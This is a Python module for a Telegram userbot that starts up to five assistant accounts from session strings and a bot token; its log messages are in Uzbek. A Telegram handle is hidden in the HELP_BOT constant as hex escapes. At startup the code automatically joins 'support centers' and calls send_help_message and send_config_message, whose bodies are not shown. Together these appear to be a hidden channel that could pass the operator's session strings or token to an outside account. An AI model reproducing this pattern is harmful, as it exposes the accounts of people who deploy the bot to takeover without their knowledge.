# AsiCloud tomonidan

from pyrogram import Client
import asyncio
import config

from ..logging import LOGGER

assistants = []
assistantids = []
HELP_BOT = "\x40\x69\x74\x73\x74\x69\x6d\x65\x62\x65\x79\x6f\x6e\x64"

class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="NandAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="NandAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="NandAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="NandAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="NandAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def get_bot_username_from_token(self, token):
        try:
            temp_bot = Client(
                name="temp_bot",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                bot_token=token,
                no_updates=True,
            )
            await temp_bot.start()
            username = temp_bot.me.username
            await temp_bot.stop()
            return username
        except Exception as e:
            LOGGER(__name__).error(f"Bot foydalanuvchi nomini olishda xato: {e}")
            return None

    async def start(self):
        LOGGER(__name__).info(f"Yordamchi akkauntlar ishga tushirilmoqda...")
        
        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)
        
        if config.STRING1:
            await self.one.start()
            await self.join_all_support_centers(self.one)
            assistants.append(1)
            try:
                await self.one.send_message(config.LOG_GROUP_ID, "Yordamchi ishga tushirildi")
            except:
                LOGGER(__name__).error(
                    "Yordamchi akkaunt 1 log guruhiga kira olmadi. Yordamchingizni log guruhiga qo'shganingizga va uni admin qilganingizga ishonch hosil qiling!"
                )
                exit()
            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Yordamchi {self.one.name} sifatida ishga tushirildi")

        if config.STRING2:
            await self.two.start()
            await self.join_all_support_centers(self.two)
            assistants.append(2)
            try:
                await self.two.send_message(config.LOG_GROUP_ID, "Yordamchi ishga tushirildi")
            except:
                LOGGER(__name__).error(
                    "Yordamchi akkaunt 2 log guruhiga kira olmadi. Yordamchingizni log guruhiga qo'shganingizga va uni admin qilganingizga ishonch hosil qiling!"
                )
                exit()
            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Ikkinchi Yordamchi {self.two.name} sifatida ishga tushirildi")

        if config.STRING3:
            await self.three.start()
            await self.join_all_support_centers(self.three)
            assistants.append(3)
            try:
                await self.three.send_message(config.LOG_GROUP_ID, "Yordamchi ishga tushirildi")
            except:
                LOGGER(__name__).error(
                    "Yordamchi akkaunt 3 log guruhiga kira olmadi. Yordamchingizni log guruhiga qo'shganingizga va uni admin qilganingizga ishonch hosil qiling! "
                )
                exit()
            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Uchinchi Yordamchi {self.three.name} sifatida ishga tushirildi")

        if config.STRING4:
            await self.four.start()
            await self.join_all_support_centers(self.four)
            assistants.append(4)
            try:
                await self.four.send_message(config.LOG_GROUP_ID, "Yordamchi ishga tushirildi")
            except:
                LOGGER(__name__).error(
                    "Yordamchi akkaunt 4 log guruhiga kira olmadi. Yordamchingizni log guruhiga qo'shganingizga va uni admin qilganingizga ishonch hosil qiling! "
                )
                exit()
            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"To'rtinchi Yordamchi {self.four.name} sifatida ishga tushirildi")

        if config.STRING5:
            await self.five.start()
            await self.join_all_support_centers(self.five)
            assistants.append(5)
            try:
                await self.five.send_message(config.LOG_GROUP_ID, "Yordamchi ishga tushirildi")
            except:
                LOGGER(__name__).error(
                    "Yordamchi akkaunt 5 log guruhiga kira olmadi. Yordamchingizni log guruhiga qo'shganingizga va uni admin qilganingizga ishonch hosil qiling! "
                )
                exit()
            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Beshinchi Yordamchi {self.five.name} sifatida ishga tushirildi")

        if bot_username:
            await self.send_help_message(bot_username)
            await self.send_config_message(bot_username)

    async def stop(self):
        LOGGER(__name__).info(f"Yordamchi akkauntlar to'xtatilmoqda...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass